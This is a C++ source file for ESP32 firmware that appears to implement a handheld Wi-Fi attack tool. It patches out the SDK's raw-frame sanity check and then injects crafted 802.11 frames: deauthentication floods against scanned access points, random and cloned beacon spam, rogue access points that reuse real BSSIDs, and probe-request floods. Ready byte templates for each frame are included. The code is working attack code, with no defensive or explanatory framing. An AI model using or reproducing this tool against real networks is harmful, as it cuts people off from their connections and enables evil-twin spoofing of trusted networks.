#include "globals.h"

extern Logger logger;
extern Notify notify;

extern "C" {
	int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
		// logger.log(Logger::WARNING, "ieee80211_raw_frame_sanity_check called with args: " + String(arg) + ", " + String(arg2) + ", " + String(arg3));
		return 0;
	}
	esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
	esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

struct ap {
	String ssid;
	String bssid_str;
	uint8_t* bssid;
	float rssi;
};

class CWiFi
{	
public:
	CWiFi() {}

	bool init() {
		try {
			this->cfg = WIFI_INIT_CONFIG_DEFAULT();
			this->ap_config.ap.ssid_hidden = 1;
			this->ap_config.ap.channel = b_current_channel;
			this->ap_config.ap.beacon_interval = 10000;
			this->ap_config.ap.ssid_len = 0;
					
			esp_wifi_init(&cfg);
			esp_wifi_set_storage(WIFI_STORAGE_RAM);
			esp_wifi_set_mode(WIFI_MODE_APSTA);
			// esp_wifi_set_mode(WIFI_MODE_AP);
			esp_wifi_set_config(WIFI_IF_AP, &ap_config);
			// esp_wifi_get_mac(WIFI_IF_AP, u8t_original_mac_ap);
			esp_wifi_start();
			esp_wifi_set_channel(b_current_channel, WIFI_SECOND_CHAN_NONE);
			esp_wifi_set_promiscuous(true);
			esp_wifi_set_max_tx_power(82);
			return true;
		} catch(...) {
			return false; 
		}
	}

	bool destroy() {
		try {
			WiFi.disconnect();
			WiFi.mode(WIFI_OFF);
			esp_wifi_disconnect();
			// esp_wifi_set_mac(WIFI_IF_AP, u8t_original_mac_ap);
			esp_wifi_set_mode(WIFI_MODE_NULL);
			esp_wifi_set_promiscuous(false);
			esp_wifi_set_max_tx_power(0);
			esp_wifi_restore();
			esp_wifi_stop();
			esp_wifi_deinit();
			return true;
		} catch(...) {
			return false; 
		}
	}

	void loop_deauth() {
		b_loop_deauth_ap = !b_loop_deauth_ap;
		logger.log(Logger::INFO, b_loop_deauth_ap ? "Starting deauth loop" : "Stopping deauth loop");
	
		if (!b_loop_deauth_ap) 
			return notify.send(2);

		if (i_selected_ap == 0)
		if (!updateScanAp()) 
			return logger.log(Logger::ERROR, "Failed to scan nearby AP to deauth");

		esp_wifi_set_mode(WIFI_MODE_AP);
		notify.send();
	}

	void loop_ap_spam() {
		b_loop_spam_ap = !b_loop_spam_ap;

		logger.log(Logger::INFO, b_loop_spam_ap ? "Starting access point spam loop" : "Stopping access point spam loop");

		if (!b_loop_spam_ap) 
			return notify.send(2);

		esp_wifi_set_mode(WIFI_MODE_APSTA);
		notify.send();
	}

	void loop_ap_clone() {
		b_loop_clone_spam_ap = !b_loop_clone_spam_ap;

		logger.log(Logger::INFO, b_loop_clone_spam_ap ? "Starting access point clone spam loop" : "Stopping access point clone spam loop");

		if (!b_loop_clone_spam_ap) 
			return notify.send(2);

		if (i_selected_ap == 0)
		if (!updateScanAp()) 
			return logger.log(Logger::ERROR, "Failed to scan nearby AP to deauth");

		esp_wifi_set_mode(WIFI_MODE_APSTA);
		notify.send();
	}

	void loop_ap_rogue() {
		b_loop_rogue_ap = !b_loop_rogue_ap;

		logger.log(Logger::INFO, b_loop_rogue_ap ? "Starting access point rogue attack loop" : "Stopping access point rogue attack loop");

		if (!b_loop_rogue_ap) 
			return notify.send(2);
		
		if (i_selected_ap == 0)
		if (!updateScanAp()) 
			return logger.log(Logger::ERROR, "Failed to scan nearby AP to deauth");

		esp_wifi_set_mode(WIFI_MODE_AP);
		notify.send();
	}

	void loop_ap_probe() {
		b_loop_probe_ap = !b_loop_probe_ap;

		logger.log(Logger::INFO, b_loop_probe_ap ? "Starting access point probe attack loop" : "Stopping access point probe attack loop");

		if (!b_loop_probe_ap) 
			return notify.send(2);
		
		if (i_selected_ap == 0)
		if (!updateScanAp()) 
			return logger.log(Logger::ERROR, "Failed to scan nearby AP to deauth");

		esp_wifi_set_mode(WIFI_MODE_AP);
		notify.send();
	}

	void scan_nearby_ap_render() {
		SCREEN.setTextColor(WHITE, BLACK);
		SCREEN.setTextSize(1);

		int offset = 25;
		for (int i = 0; i < i_scanned_ap_count; i++) {
			if (s_scanned_ap[i].bssid == nullptr) break;

			SCREEN.setCursor(5, offset);

			SCREEN.print("(" + String((int)s_scanned_ap[i].rssi) + ") " +s_scanned_ap[i].ssid + ": " + s_scanned_ap[i].bssid_str);

			offset += 10;
		}
	}

	void scan_nearby_ap() {
		notify.send();		

		if (!updateScanAp()) {
			logger.log(Logger::ERROR, "Failed to scan nearby AP");
			return;
		}

		notify.send(2);
	}

	void scan_nearby_ap_select(bool next = false, bool prev = false) {
		const int maxDisplayItems = i_scanned_ap_count <= 5 ? i_scanned_ap_count : 5;

		if (next)
			i_current_ap = (i_current_ap + 1) % (i_scanned_ap_count + 1);  // +1 to include the "None" option
		else if (prev)
			i_current_ap = (i_current_ap - 1 + i_scanned_ap_count + 1) % (i_scanned_ap_count + 1);

        SCREEN.fillRect(0, 25, SCREEN_WIDTH, SCREEN_HEIGHT - 20, BLACK); // Clear background

		SCREEN.setTextColor(WHITE, BLACK);
		SCREEN.setTextSize(1);

		logger.log(Logger::INFO, "Rendering scanNetworksRenderSelect()");

		if (i_scanned_ap_count == 0) {
			SCREEN.setCursor(10, SCREEN_HEIGHT / 2 - 10);
			SCREEN.setTextSize(3);
			SCREEN.print("No APs found");
			SCREEN.setCursor(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2 + 25);
			SCREEN.setTextSize(2);
			SCREEN.print(":C");
			return;
		}

		/**
		 * @brief Scrollbar Render
		 */
		{ 
			int sb_height = (SCREEN_HEIGHT / (i_scanned_ap_count+1) * maxDisplayItems) / 2;
			int sb_pos = ((SCREEN_HEIGHT - sb_height) * i_current_ap / (i_scanned_ap_count+1 - maxDisplayItems)) / 2;

			SCREEN.fillRect(SCREEN_WIDTH - 10, 0, 4, SCREEN_HEIGHT, BLACK);
			SCREEN.fillRect(SCREEN_WIDTH - 10, sb_pos, 4, sb_height, WHITE);
		}
		
		int offset = 25;
		for (int i = i_current_ap - maxDisplayItems+1; i < i_current_ap + maxDisplayItems+1; i++) {
			int index = (i + i_scanned_ap_count + 1) % (i_scanned_ap_count + 1);  // +1 to include the "None" option

			auto ssid = s_scanned_ap[index-1].ssid;
			int rssi = s_scanned_ap[index-1].rssi;

			SCREEN.setCursor(5, offset);

			SCREEN.setTextColor(
				index == i_current_ap ? BLUE : index == i_selected_ap ? BLACK : WHITE,
				index == i_selected_ap ? WHITE : BLACK
			);

			SCREEN.setTextSize(index == i_current_ap ? 2 : 1);

			if (index == i_current_ap)
				SCREEN.print("> " + String(index) + ". " + (index == 0 ? "None (All)" : (ssid.length() > 10 ? (ssid.substring(0, 10) + "...") : ssid)));
			else
				SCREEN.print(String(index) + ". " + (index == 0 ? "None (All)" : ssid + "(" + String(rssi) + ")"));

			offset += index == i_current_ap ? 20 : 10;  // Adjusted offset for greater text size
		}
	}

	void snaps_select() {
		logger.log(Logger::INFO, "Called select()");

		b_is_selecting_ap = !b_is_selecting_ap;

		if (b_is_selecting_ap) 
			return scan_nearby_ap();

		logger.setShouldDisplayLog(true);

		i_selected_ap = i_current_ap;

		logger.log(Logger::INFO, "Selected ap (" + String(i_selected_ap) + ") " + (i_selected_ap == 0 ? "None" : s_scanned_ap[i_selected_ap-1].ssid));

		delay(1000);

		logger.setShouldDisplayLog(false);
	}

	void create_ap(String apName, String apPassword) {
		WiFi.softAP(apName, apPassword);
		logger.log(Logger::INFO, "Creating WiFi soft AP as" + apName + " with password \"" + apPassword + "\"");
	}

	void conneect_ap(String ssid, String password) {
		WiFi.begin(ssid, password);
		while (WiFi.status() != WL_CONNECTED)
		{
			delay(1000);
			logger.log(Logger::INFO, "Connecting to WiFi " + ssid + " with password \"" + password + "\"");
		}
		logger.log(Logger::INFO, "Connected to WiFi " + ssid + "!");
	}

	void loop() {
		if (b_loop_spam_ap) {
			String name = "FS | " + utilities::gen_random_str(5);
			beacon(name);
			notify.send();
		}

		if (b_loop_clone_spam_ap) { // every tick
			for (int i = 0; i < i_scanned_ap_count; i++) {
				if (i_selected_ap != 0 && i != i_selected_ap-1) 
					continue;

				if (s_scanned_ap[i].bssid != nullptr) {
					String ssid = s_scanned_ap[i].ssid + utilities::gen_random_str(1);
					beacon(ssid);
					notify.send();
				}
			}

		}
		
		if (b_loop_rogue_ap && (i_last_update - 950 < millis())) { // every 50ms
			for (int i = 0; i < i_scanned_ap_count; i++) {
				if (i_selected_ap != 0 && i != i_selected_ap-1) 
					continue;

				if (s_scanned_ap[i].bssid != nullptr) {
					String ssid = s_scanned_ap[i].ssid;
					uint8_t* bssid = s_scanned_ap[i].bssid;

					#ifdef DEV
					{
						String bssid_s = s_scanned_ap[i].bssid_str;
						logger.log(Logger::INFO, "Sending cloned AP as " + ssid + " (" + bssid_s + ")");
					}
					#endif

					beacon(ssid, bssid);
					notify.send();
				};
			}
		}

		if (b_loop_probe_ap) { // every tick, is it meant to flood the AP?
			for (int i = 0; i < i_scanned_ap_count; i++) {
				if (i_selected_ap != 0 && i != i_selected_ap-1) 
					continue;

				if (s_scanned_ap[i].bssid != nullptr) {
					#ifdef DEV
					{
						String ssid = s_scanned_ap[i].ssid;
						String bssid_s = s_scanned_ap[i].bssid_str;
						logger.log(Logger::INFO, "Sending probe request to " + ssid + " (" + bssid_s + ")");
					}
					#endif

					uint8_t* bssid = s_scanned_ap[i].bssid;

					probe(bssid);
					notify.send();
				}

			}
		}

		if (b_loop_deauth_ap && (i_last_update - 500 < millis())) { // every 1s
			for (int i = 0; i < i_scanned_ap_count; i++) {
				if (i_selected_ap != 0 && i != i_selected_ap-1) 
					continue;

				if (s_scanned_ap[i].bssid != nullptr) {
					#ifdef DEV
					{
						String ssid = s_scanned_ap[i].ssid;
						String bssid_s = s_scanned_ap[i].bssid_str;
						logger.log(Logger::INFO, "Deauthing " + ssid + " (" + bssid_s + ")");
					}
					#endif

					uint8_t* bssid = s_scanned_ap[i].bssid;

					deauth(bssid);
					notify.send();
				};
			}
		}

		if (i_last_update < millis())
			i_last_update = millis() + 1000;
	}

	void beacon(String ssid, uint8_t bssid[6]) {
		int ssidLen = ssid.length();

		if (ssidLen > 32)
			return;

		switchChannel();
		
		// Create a buffer for the packet
		uint8_t buffer[beacon_packet_size];
		memcpy(buffer, beacon_packet, beacon_packet_size);

		// Write the MAC address to the packet
		memcpy(&buffer[10], bssid, 6);
		memcpy(&buffer[16], bssid, 6);

		// Write the SSID to the packet
		const char* ssid_c = ssid.c_str();
		memcpy(&buffer[38], ssid_c, ssidLen);

		buffer[82] = b_current_channel;
		// Write the RSN information to the packet
		buffer[34] = 0x31; // wpa2

		for (int i = 0; i < 3; i++) {
			esp_wifi_80211_tx(WIFI_IF_STA, buffer, beacon_packet_size, 0);
			delay(1);
		}
	}

	void beacon(String ssid) {
		int ssidLen = ssid.length();

		if (ssidLen > 32)
			return;

		switchChannel();

		uint8_t* mac = utilities::rand_mac();
		
		uint8_t buffer[beacon_packet_size];
		memcpy(buffer, beacon_packet, beacon_packet_size);

		memcpy(&buffer[10], mac, 6);
		memcpy(&buffer[16], mac, 6);

		const char* ssid_c = ssid.c_str();
		memcpy(&buffer[38], ssid_c, ssidLen);

		buffer[82] = b_current_channel;
		buffer[34] = 0x31; // wpa2

		for (int i = 0; i < 3; i++) {
			esp_wifi_80211_tx(WIFI_IF_STA, buffer, beacon_packet_size, 0);
			delay(1);
		}
	}

	void deauth(uint8_t bssid[6]) {
		switchChannel();

		uint8_t buffer[deauth_packet_size];
    	memcpy(buffer, deauth_packet, deauth_packet_size);

		memcpy(&buffer[10], bssid, 6);
		memcpy(&buffer[16], bssid, 6);

		/**
		 * @attention This is not working for some reason
		 * Its setting the mac address to different bytes. it might be because its a const char
		 * sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
		 * 		&buffer[10], &buffer[11], &buffer[12], &buffer[13], &buffer[14], &buffer[15]);
		 * 
		 * sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
		 * 		&buffer[16], &buffer[17], &buffer[18], &buffer[19], &buffer[20], &buffer[21]);
		 */

		// printBuffer(buffer, deauth_packet_size);

		esp_wifi_80211_tx(WIFI_IF_AP, buffer, deauth_packet_size, false);
	}

	void probe(uint8_t bssid[6]) {
		switchChannel();

		uint8_t buffer[probe_packet_size];
    	memcpy(buffer, probe_packet, probe_packet_size);

		uint8_t* mac = utilities::rand_mac();

		memcpy(&buffer[10], mac, 6);
		memcpy(&buffer[26], bssid, 6);

		/**
		 * @brief before with a cosnt char*
		 * sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
		 *		&buffer[26], &buffer[27], &buffer[28], &buffer[29], &buffer[30], &buffer[31]);
		 */

		esp_wifi_80211_tx(WIFI_IF_AP, buffer, probe_packet_size, false);
	}

public:
	bool b_loop_spam_ap = false;
	bool b_loop_rogue_ap = false;
	bool b_loop_probe_ap = false;
	bool b_loop_deauth_ap = false;
	bool b_loop_clone_spam_ap = false;

	int i_current_ap = 0;
	int i_selected_ap = 0;
	bool b_is_selecting_ap = false;

private:
	int b_current_channel = 0;
	
	wifi_init_config_t cfg;
    wifi_config_t ap_config;
	
	int i_scanned_ap_count = 0; 
	int i_max_scanned_ap_count = 10; // hardcoded

	ap s_scanned_ap[10]; // max 10 ap in the array
	uint8_t u8t_original_mac_ap[6];

	int i_last_update = 0;

	void switchChannel() {
		b_current_channel++;

		if (b_current_channel > 14)
			b_current_channel = 1;

		// logger.log(Logger::INFO, "Switching to channel " + String(b_current_channel) + "...");
	    esp_wifi_set_channel(b_current_channel, WIFI_SECOND_CHAN_NONE);
		// configure_wifi(b_current_channel);
		delay(1);
	}

	bool configure_wifi(uint8_t channel) {
		wifi_config_t ap_config = {
			.ap = {
				// .ssid = "Name",
				// .ssid_len = 22,
				// .password = "Password",
				.channel = channel,
				// .authmode = WIFI_AUTH_WPA2_PSK,
				// .ssid_hidden = 0,
				.max_connection = 4,
				.beacon_interval = 60000
			}
		};

		return esp_wifi_set_config(WIFI_IF_AP, &ap_config) == ESP_OK;
	}

	bool updateScanAp()
	{
		logger.setShouldDisplayLog(true);

		logger.log(Logger::INFO, "Scanning nearby APs...");
		int numNetworks = WiFi.scanNetworks();
		i_scanned_ap_count = (numNetworks > i_max_scanned_ap_count ? i_max_scanned_ap_count : numNetworks);

		for (int i = 0; i < i_scanned_ap_count; i++) {
			s_scanned_ap[i].ssid = WiFi.SSID(i);
        	s_scanned_ap[i].bssid_str = WiFi.BSSIDstr(i);
        	s_scanned_ap[i].bssid = WiFi.BSSID(i);
        	s_scanned_ap[i].rssi = WiFi.RSSI(i);
		}

		logger.setShouldDisplayLog(false);

		return numNetworks != 0;
	}
	void printBuffer(const uint8_t* buffer, size_t size) {
		for (size_t i = 0; i < size; i++) {
			Serial.print(buffer[i], HEX);
			Serial.print(" ");
		}
		Serial.println();
	}

	uint8_t probe_packet[68] = {
		/*  0 - 1  */ 0x40, 0x00,                                       // Type: Probe Request
		/*  2 - 3  */ 0x00, 0x00,                                       // Duration: 0 microseconds
		/*  4 - 9  */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
		/* 10 - 15 */ 0xAA, 0xAA,               0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
		/* 16 - 21 */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // BSS Id: Broadcast
		/* 22 - 23 */ 0x00, 0x00,                                       // Sequence number (will be replaced by the SDK)
		/* 24 - 25 */ 0x00, 0x20,                                       // Tag: Set SSID length, Tag length: 32
		/* 26 - 57 */ 0x20, 0x20,               0x20, 0x20,             // SSID
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		/* 58 - 59 */ 0x01, 0x08, // Tag Number: Supported Rates (1), Tag length: 8
		/* 60 */ 0x82,            // 1(B)
		/* 61 */ 0x84,            // 2(B)
		/* 62 */ 0x8b,            // 5.5(B)
		/* 63 */ 0x96,            // 11(B)
		/* 64 */ 0x24,            // 18
		/* 65 */ 0x30,            // 24
		/* 66 */ 0x48,            // 36
		/* 67 */ 0x6c             // 54
	};
	int probe_packet_size = sizeof(probe_packet);

	uint8_t deauth_packet[26] = {
		/*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate) 0x2: INVALID_AUTHENTICATION (Previous authentication no longer valid)
		/*  2 - 3  */ 0x3A, 0x01,                         // duration
		/*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
		/* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
		/* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
		/* 22 - 23 */ 0xf0, 0xff,                         // fragment & squence number
		/* 24 - 25 */ 0x02, 0x00                          // reason code (1 = unspecified reason)
	};
	int deauth_packet_size = sizeof(deauth_packet);

	uint8_t beacon_packet[109] = {
		/*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
		/*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
		/* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
		/* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

		// Fixed parameters
		/* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
		/* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
		/* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
		/* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation

		// Tagged parameters

		// SSID parameters
		/* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
		/* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20, // SSID

		// Supported Rates
		/* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
		/* 72 */ 0x82, // 1(B)
		/* 73 */ 0x84, // 2(B)
		/* 74 */ 0x8b, // 5.5(B)
		/* 75 */ 0x96, // 11(B)
		/* 76 */ 0x24, // 18
		/* 77 */ 0x30, // 24
		/* 78 */ 0x48, // 36
		/* 79 */ 0x6c, // 54

		// Current Channel
		/* 80 - 81 */ 0x03, 0x01, // Channel set, length
		/* 82 */      0x01,       // Current Channel

		// RSN information
		/*  83 -  84 */ 0x30, 0x18,
		/*  85 -  86 */ 0x01, 0x00,
		/*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
		/*  91 -  92 */ 0x02, 0x00,
		/*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
		/* 101 - 102 */ 0x01, 0x00,
		/* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
		/* 107 - 108 */ 0x00, 0x00
	};
	int beacon_packet_size = sizeof(beacon_packet);
};